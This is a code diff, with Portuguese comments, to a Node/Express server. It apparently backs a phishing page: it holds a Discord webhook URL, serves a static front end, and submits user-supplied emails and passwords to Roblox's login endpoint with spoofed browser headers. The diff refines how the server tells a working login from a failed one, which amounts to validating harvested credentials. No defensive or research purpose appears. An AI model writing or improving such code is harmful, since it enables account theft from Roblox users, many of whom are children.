@@ -9,19 +9,19 @@ const WEBHOOK_URL = "https://discord.com/api/webhooks/1534375079855784046/bnLKoW
 app.use(express.json());
 app.use(express.static('.'));
 
-// Função para fazer login no Roblox (Método Mais Estável)
+// Função para fazer login no Roblox
 async function loginRoblox(email, password) {
     const loginUrl = "https://www.roblox.com/users/login";
     
     try {
-        // Tenta fazer o POST
         const response = await fetch(loginUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
                 'Accept': 'application/json',
-                'X-Requested-With': 'XMLHttpRequest'
+                'X-Requested-With': 'XMLHttpRequest',
+                'Referer': 'https://www.roblox.com/'
             },
             body: JSON.stringify({
                 username: email,
@@ -30,17 +30,29 @@ async function loginRoblox(email, password) {
             timeout: 10000
         });
 
-        const data = await response.json();
-
-        // O Roblox retorna:
-        // Sucesso: { id: 12345, username: "User" }
-        // Erro: { error: "User not found" } ou { error: "Invalid password" }
+        // Pega no texto bruto para ver o que o Roblox realmente devolveu
+        const text = await response.text();
         
-        if (data.id && data.id > 0) {
+        let data;
+        try {
+            data = JSON.parse(text);
+        } catch (e) {
+            // Se não for JSON (ex: página HTML de erro)
+            return { 
+                success: false, 
+                data: null, 
+                error: "Resposta não-JSON do Roblox: " + text.substring(0, 100) 
+            };
+        }
+
+        // O Roblox retorna { id: 123, username: "User" } no sucesso
+        // Ou { error: "User not found" } no erro
+        
+        if (data.id && typeof data.id === 'number') {
             return { success: true, data: data, error: null };
         } else {
-            // Se não tem ID, verifica o erro específico
-            const errorMsg = data.error || "Resposta estranha do Roblox";
+            // Se não tem ID, pega no erro ou diz o que foi
+            const errorMsg = data.error || data.message || "Sem resposta válida (ID ausente)";
             return { success: false, data: data, error: errorMsg };
         }
 
